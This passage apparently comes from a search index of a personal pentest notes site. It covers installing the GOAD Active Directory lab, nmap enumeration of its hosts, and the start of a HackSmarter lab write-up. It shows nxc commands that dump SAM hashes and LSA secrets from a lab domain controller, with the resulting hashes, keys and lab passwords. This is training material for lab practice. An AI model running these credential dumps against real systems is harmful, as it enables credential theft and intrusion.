/home/kali/.nxc/logs/ntds/WINTERFELL_10.10.10.11_2025-12-05_155916.ntds | cut -d ':' -f1\n</code></pre>"},{"location":"GOAD/North/#foothold","title":"Foothold","text":"<p>Research findings, data insights, and key considerations and document how you got a foothold on the vulnerable box</p>"},{"location":"GOAD/North/#extracting-hashes-from-sam-database","title":"Extracting Hashes from SAM Database","text":"<pre><code>nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --sam                                                                                                              \u2500\u256f\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\robb.stark:sexywolfy (Pwn3d!)\nSMB         10.10.10.11     445    WINTERFELL       [*] Dumping SAM hashes\nSMB         10.10.10.11     445    WINTERFELL       Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::\nSMB         10.10.10.11     445    WINTERFELL       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nSMB         10.10.10.11     445    WINTERFELL       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[12:48:52] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                   regsecrets.py:436\nSMB         10.10.10.11     445    WINTERFELL       [+] Added 3 SAM hashes to the database\n</code></pre>"},{"location":"GOAD/North/#dumping-the-local-users-password-hash","title":"Dumping the Local User\u2019s password hash","text":"<pre><code>nxc smb 10.10.10.11 -u 'robb.stark' -p 'sexywolfy' --lsa                                                                                                             \nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\\robb.stark:sexywolfy (Pwn3d!)\nSMB         10.10.10.11     445    WINTERFELL       [+] Dumping LSA secrets\nSMB         10.10.10.11     445    WINTERFELL       NORTH\\WINTERFELL$:aes256-cts-hmac-sha1-96:40aaf0701af5d16a5fd818ecffe11a56a1189474e6d5ed1fc85ca32ce9a6d0a7\nSMB         10.10.10.11     445    WINTERFELL       NORTH\\WINTERFELL$:aes128-cts-hmac-sha1-96:744c6cf0bd5a1563b9ece25e226defd0\nSMB         10.10.10.11     445    WINTERFELL       NORTH\\WINTERFELL$:des-cbc-md5:195716ab31896b0e\nSMB         10.10.10.11     445    WINTERFELL       NORTH\\WINTERFELL$:plain_password_hex:f0bddd1fbd0c86486945b66c7187e1cc7894ae9b8c474fb0696ff202d95438369df613dc4167005425ad3f820c44188b96130a9a0ee3e17ff9103042bf9590b99eb36248fbf1036617fd1cf6c6d8c554b6c675b1044c32ff998c9802b80adb10bec54bf7304e299018e1ec381593a96dd36587f45983ea6158b50648f99998195ce125d194a8b15857b93407f03fe0c16d44fb2213bdc48e6a875a2d00e538919c7e4151c6c744bad8683fd5b21fc8c51decd55236dd423bfa470ec4ee10e638f92ea28b3f20a4bd35c201911060099bbb1bcb1d7f87144b39a4f84694abe0e468c93a9f1e34660bc5bd7576fb4bfe73\nSMB         10.10.10.11     445    WINTERFELL       NORTH\\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:5d43c3d692608fef8fab6fb766b2bd10:::\nSMB         10.10.10.11     445    WINTERFELL       NORTH\\robb.stark:sexywolfy\nSMB         10.10.10.11     445    WINTERFELL       dpapi_machinekey:0xa07dedba3f42b271fbb70b6712eaec73474ed8c7\ndpapi_userkey:0x1883acd917d81da855076b023f86c1892f3ba2fa\n</code></pre>"},{"location":"GOAD/North/#privilege-escalation","title":"Privilege Escalation","text":"<p>Document how you were able to more laterally and gain a higher privilege</p>"},{"location":"GOAD/North/#resources-used","title":"Resources used","text":"<p>Action items, timeline, and resource requirements</p>"},{"location":"GOAD/braavos/","title":"GOAD - braavos.essos.local","text":""},{"location":"GOAD/castleBlack/","title":"GOAD - castelblack.north.sevenkingdoms.local","text":""},{"location":"GOAD/enumeration/","title":"GOAD - Enumeration","text":"<pre><code>Created by: Dcyberguy \nCreated time: October 31, 2025 8:31 PM\nLast edited by: Dcyberguy \nLast updated time: December 11, 2025 10:11 PM\nStatus: Done\n</code></pre>"},{"location":"GOAD/enumeration/#goad-vm-status","title":"GOAD VM Status","text":"<pre><code>GOAD/vmware/local/10.10.10.X (280025-goad-vmware) &gt; status\n[*] CWD: /workspace/280025-goad-vmware/provider\n[*] Running command : vagrant.exe status\nCurrent machine states:\n\nGOAD-DC01                 running (vmware_desktop)\nGOAD-DC02                 running (vmware_desktop)\nGOAD-DC03                 running (vmware_desktop)\nGOAD-SRV02                running (vmware_desktop)\nGOAD-SRV03                running (vmware_desktop)\n\nThis environment represents multiple VMs. The VMs are all listed\nabove with their current state. For more information about a specific\nVM, run `vagrant status NAME`.\n</code></pre>"},{"location":"GOAD/enumeration/#goad-architecture-diagram","title":"GOAD - Architecture Diagram","text":"<p>Using <code>nxc</code> can enumerate briefly what hosts are online, hostname and machine build</p> <pre><code>nxc smb 10.10.10.0/24                                                                                                                                                 \u2500\u256f\nSMB         10.10.10.12     445    MEEREEN          [*] Windows 10 / Server 2016 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) \nSMB         10.10.10.10     445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)\nSMB         10.10.10.22     445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)\nSMB         10.10.10.23     445    BRAAVOS          [*] Windows 10 / Server 2016 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) \nRunning nxc against 256 targets \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 100% 0:00:00\n</code></pre> <p>For efficiency, add the below Hostnames and IP's to your host file @ <code>/etc/hosts</code>. Change the Ip Address to fit your current setup. </p><pre><code>10.10.10.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding\n10.10.10.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell\n10.10.10.12   essos.local meereen.essos.local meereen\n10.10.10.22   castelblack.north.sevenkingdoms.local castelblack\n10.10.10.23   braavos.essos.local braavos\n</code></pre><p></p>"},{"location":"GOAD/enumeration/#kingslandingsevenkingdomslocal","title":"kingslanding.sevenkingdoms.local","text":"<pre><code>Nmap scan report for 10.10.10.10\nHost is up (0.00083s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-01 00:36:17Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:21:29\n|_Not valid after:  2026-10-18T19:21:29\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:21:29\n|_Not valid after:  2026-10-18T19:21:29\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:kingslanding.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:21:29\n|_Not valid after:  2026-10-18T19:21:29\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: SEVENKINGDOMS\n|   NetBIOS_Domain_Name: SEVENKINGDOMS\n|   NetBIOS_Computer_Name: KINGSLANDING\n|   DNS_Domain_Name: sevenkingdoms.local\n|   DNS_Computer_Name: kingslanding.sevenkingdoms.local\n|   DNS_Tree_Name: sevenkingdoms.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-11-01T00:36:24+00:00\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local\n| Not valid before: 2025-10-17T18:46:35\n|_Not valid after:  2026-04-18T18:46:35\nService Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-11-01T00:36:24\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:49:3d:bd (VMware)\n</code></pre>"},{"location":"GOAD/enumeration/#winterfellnorthsevenkingdomslocal","title":"winterfell.north.sevenkingdoms.local","text":"<pre><code>Nmap scan report for 10.10.10.11\nHost is up (0.0012s latency).\nNot shown: 988 closed tcp ports (conn-refused)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-01 01:19:44Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-18T19:53:39\n|_Not valid after:  2026-10-18T19:53:39\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local\n| Not valid before: 2025-10-17T19:07:41\n|_Not valid after:  2026-04-18T19:07:41\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: NORTH\n|   NetBIOS_Domain_Name: NORTH\n|   NetBIOS_Computer_Name: WINTERFELL\n|   DNS_Domain_Name: north.sevenkingdoms.local\n|   DNS_Computer_Name: winterfell.north.sevenkingdoms.local\n|   DNS_Tree_Name: sevenkingdoms.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-11-01T01:20:31+00:00\nService Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: mean: -1s, deviation: 0s, median: -1s\n| smb2-time: \n|   date: 2025-11-01T01:20:30\n|_  start_date: N/A\n|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:02:cb:41 (VMware)\n</code></pre>"},{"location":"GOAD/enumeration/#castelblacknorthsevenkingdomslocal","title":"castelblack.north.sevenkingdoms.local","text":"<pre><code>Nmap scan report for 10.10.10.22\nHost is up (0.00087s latency).\nNot shown: 994 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-11-01T00:02:43\n|_Not valid after:  2055-11-01T00:02:43\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: NORTH\n|   NetBIOS_Domain_Name: NORTH\n|   NetBIOS_Computer_Name: CASTELBLACK\n|   DNS_Domain_Name: north.sevenkingdoms.local\n|   DNS_Computer_Name: castelblack.north.sevenkingdoms.local\n|   DNS_Tree_Name: sevenkingdoms.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-11-01T00:36:25+00:00\n| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local\n| Not valid before: 2025-10-17T19:20:10\n|_Not valid after:  2026-04-18T19:20:10\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-11-01T00:36:24\n|_  start_date: N/A\n|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:65:b7:c5 (VMware)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n</code></pre>"},{"location":"GOAD/enumeration/#meereenessoslocal","title":"meereen.essos.local","text":"<pre><code>Nmap scan report for 10.10.10.12\nHost is up (0.0014s latency).\nNot shown: 988 closed tcp ports (conn-refused)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-01 01:19:50Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=meereen.essos.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local\n| Not valid before: 2025-10-18T19:21:41\n|_Not valid after:  2026-10-18T19:21:41\n445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ESSOS)\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=meereen.essos.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local\n| Not valid before: 2025-10-18T19:21:41\n|_Not valid after:  2026-10-18T19:21:41\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=meereen.essos.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local\n| Not valid before: 2025-10-18T19:21:41\n|_Not valid after:  2026-10-18T19:21:41\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: essos.local, Site: Default-First-Site-Name)\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\n| ssl-cert: Subject: commonName=meereen.essos.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:meereen.essos.local\n| Not valid before: 2025-10-18T19:21:41\n|_Not valid after:  2026-10-18T19:21:41\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=meereen.essos.local\n| Not valid before: 2025-10-17T18:46:33\n|_Not valid after:  2026-04-18T18:46:33\n| rdp-ntlm-info: \n|   Target_Name: ESSOS\n|   NetBIOS_Domain_Name: ESSOS\n|   NetBIOS_Computer_Name: MEEREEN\n|   DNS_Domain_Name: essos.local\n|   DNS_Computer_Name: meereen.essos.local\n|   DNS_Tree_Name: essos.local\n|   Product_Version: 10.0.14393\n|_  System_Time: 2025-11-01T01:20:30+00:00\n|_ssl-date: 2025-11-01T01:20:39+00:00; -1s from scanner time.\nService Info: Host: MEEREEN; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)\n|   Computer name: meereen\n|   NetBIOS computer name: MEEREEN\\x00\n|   Domain name: essos.local\n|   Forest name: essos.local\n|   FQDN: meereen.essos.local\n|_  System time: 2025-10-31T18:20:30-07:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n|_nbstat: NetBIOS name: MEEREEN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b4:1b:88 (VMware)\n|_clock-skew: mean: 46m39s, deviation: 2h20m00s, median: -1s\n| smb2-time: \n|   date: 2025-11-01T01:20:30\n|_  start_date: 2025-10-31T23:50:21\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n</code></pre>"},{"location":"GOAD/enumeration/#braavosessoslocal","title":"braavos.essos.local","text":"<pre><code>Nmap scan report for 10.10.10.23\nHost is up (0.00069s latency).\nNot shown: 994 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds\n1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2025-11-01T00:01:29\n|_Not valid after:  2055-11-01T00:01:29\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: ESSOS\n|   NetBIOS_Domain_Name: ESSOS\n|   NetBIOS_Computer_Name: BRAAVOS\n|   DNS_Domain_Name: essos.local\n|   DNS_Computer_Name: braavos.essos.local\n|   DNS_Tree_Name: essos.local\n|   Product_Version: 10.0.14393\n|_  System_Time: 2025-11-01T00:36:25+00:00\n| ssl-cert: Subject: commonName=braavos.essos.local\n| Not valid before: 2025-10-17T19:20:05\n|_Not valid after:  2026-04-18T19:20:05\n|_ssl-date: 2025-11-01T00:36:39+00:00; 0s from scanner time.\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 1h09m59s, deviation: 2h51m28s, median: 0s\n|_nbstat: NetBIOS name: BRAAVOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:66:b9:e5 (VMware)\n| smb2-time: \n|   date: 2025-11-01T00:36:24\n|_  start_date: 2025-11-01T00:00:32\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)\n|   Computer name: braavos\n|   NetBIOS computer name: BRAAVOS\\x00\n|   Domain name: essos.local\n|   Forest name: essos.local\n|   FQDN: braavos.essos.local\n|_  System time: 2025-10-31T17:36:25-07:00\n</code></pre>"},{"location":"GOAD/installation/","title":"GOAD - Installation","text":""},{"location":"GOAD/installation/#windows-installation-wsl","title":"Windows Installation (WSL)","text":""},{"location":"GOAD/installation/#goad-installation","title":"GOAD - Installation","text":"<pre><code>Created by: Dcyberguy \nCreated time: October 31, 2025 7:33 PM\nLast edited by: Dcyberguy \nLast updated time: October 31, 2025 9:33 PM\nStatus: Done\n</code></pre>"},{"location":"GOAD/installation/#installation","title":"Installation","text":"<p>Choice of Operation System</p> <p>I will be using the Windows Operating System and also Debian Linux (WSL) for this particular GOAD Install. The GOAD Repo would be on the Windows OS, same as with VMWare and VMware utility.</p> <p>The vagrant plugins would be installed from the WSL (Debian)</p>"},{"location":"GOAD/installation/#requirements","title":"Requirements:","text":"<ul> <li>VMWare workstation:</li> </ul> <p>Click below to install VMWare workstaion, if you don't already have it installed (Account needed to download)</p> <p>VM-Workstation</p> <ul> <li>Vagrant:</li> </ul> <p>Install | Vagrant | HashiCorp Developer</p> <ul> <li>Vagrant VMware utility:</li> </ul> <p>Install | Vagrant | HashiCorp Developer</p> <ul> <li>Clone the GOAD (Game of Active Directory GitHub Repo)</li> </ul> <p>GOAD</p> <ul> <li>Install the below vagrant plugins:</li> </ul> <pre><code>vagrant plugin install vagrant-reload vagrant-vmware-desktop winrm winrm-fs winrm-elevated\n</code></pre>"},{"location":"GOAD/installation/#on-the-wsl-debian","title":"On the WSL (Debian)","text":""},{"location":"GOAD/installation/#python3-virtual-env-install","title":"Python3 Virtual env Install","text":"<p>I will be using a python virtual environment <code>venv</code> on the Debian WSL to deploy GOAD</p> <pre><code>cd /mnt/c/Users/dcyberguy/\nsudo apt install python3.16-venv\npython3 -m venv venv\nsource venv/bin/activate\ncd /mnt/c/Users/dcyberguy/GOAD\n</code></pre>"},{"location":"GOAD/installation/#check-for-dependencies","title":"Check for dependencies","text":"<pre><code>./goad.sh -p vmware\nGOAD/vmware/local/192.168.56.X &gt; check\n</code></pre>"},{"location":"GOAD/installation/#install","title":"Install","text":"<ul> <li>To install run the goad script and launch install or use the goad script arguments</li> </ul> <pre><code>./goad.sh -p vmware\n# here choose the lab you want (GOAD/GOAD-Light/NHA/SCCM)\nGOAD/vmware/local/192.168.56.X &gt; set_lab &lt;lab&gt; \n\n# here choose the  ip range you want to use ex: 192.168.56 (only the first three digits)\nGOAD/vmware/local/192.168.56.X &gt; set_ip_range &lt;ip_range&gt; \n\n# Install\nGOAD/vmware/local/192.168.56.X &gt; install\n</code></pre> <p>At the end of your install, you have something like this:</p> <p></p>"},{"location":"GOAD/meereen/","title":"GOAD - meereen.essos.local (DC03)","text":""},{"location":"GOAD/overview/","title":"GOAD - Overview","text":""},{"location":"GOAD/overview/#goad-overview","title":"GOAD: Overview","text":"<pre><code>Created by: Dcyberguy \nCreated time: October 31, 2025 7:23 PM\nLast edited by: Dcyberguy \nLast updated time: October 31, 2025 9:33 PM\nStatus: Done\n</code></pre>"},{"location":"GOAD/overview/#description","title":"Description","text":"<p>GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.</p> <p><code>Warning</code>\u00a0This lab is extremely vulnerable, do not reuse recipe to build your environment and do not deploy this environment on internet without isolation (this is a recommendation, use it as your own risk).</p> <p>This repository was build for pentest practice. </p>"},{"location":"GOAD/overview/#licenses","title":"Licenses","text":"<p>This lab use free windows VM only (180 days). After that delay enter a license on each server or rebuild all the lab (may be it's time for an update ;))</p>"},{"location":"GOAD/overview/#available-labs","title":"Available labs","text":"<p>GOAD: 5 vms, 2 forests, 3 domains (full goad lab</p> <p></p> <p>GOAD-Light: 3 vms, 1 forest, 2 domains (smaller goad lab for those with a smaller pc)</p> <p></p> <p>MiniLAB: 2 vms, 1 forest, 1 domain (basic lab with one DC (windows server 2019) and one Workstation (windows 10))</p> <p>\u2022 SCCM\u00a0: 4 vms, 1 forest, 1 domain, with Microsoft configuration manager installed</p> <p></p> <p>\u2022 NHA\u00a0: A challenge with 5 vms and 2 domains. no schema provided, you will have to find out how break it.</p>"},{"location":"GOAD/sevenKingdoms/","title":"GOAD - SevenKingdoms.local (DC01)","text":""},{"location":"HackSmarter-Labs/","title":"Hacksmarter Labs","text":""},{"location":"HackSmarter-Labs/#hacksmarter-labs","title":"Hacksmarter Labs","text":"<ul> <li> HSM-Lab: Arasaka</li> <li> HSM-Labs: Ascension</li> <li> HSM-Labs: Slayer</li> <li> HSM-Labs: Welcome</li> <li> HSM-Labs: BuildingMagic</li> </ul>"},{"location":"HackSmarter-Labs/arasaka/","title":"Arasaka","text":""},{"location":"HackSmarter-Labs/arasaka/#arasaka","title":"Arasaka","text":"Info <p>Author: Dcyberguy</p> <p>Status: Published</p> <p>Last edited time: November 21, 2025 9:01 PM</p> <p>Created time: November 20, 2025 10:23 PM</p> <p><code>This is a writeup for the Hacksmarter Lab machine: Arasaka</code></p>"},{"location":"HackSmarter-Labs/arasaka/#host-information","title":"Host Information","text":"<pre><code>Ip address:             10.1.81.88\nHost OS:                Windows\nDifficulty:             Easy\nAssumed breach creds:   faraday:hacksmarter123\n</code></pre> Warning <p>alt.svc:babygirl1</p> <p>soulkiller.svc:MYpassword123#</p>"},{"location":"HackSmarter-Labs/arasaka/#enumeration","title":"Enumeration","text":"<pre><code>nmap -Pn -sV -sC -p- --min-rate=200 10.1.81.88 -T4   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-20 22:25 EST\nNmap scan report for 10.1.81.88\nHost is up (0.018s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-21 03:30:09Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.hacksmarter.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.hacksmarter.local\n| Not valid before: 2025-09-21T15:35:32\n|_Not valid after:  2026-09-21T15:35:32\n|_ssl-date: TLS randomness does not represent time\n3268/tcp  open  ldap     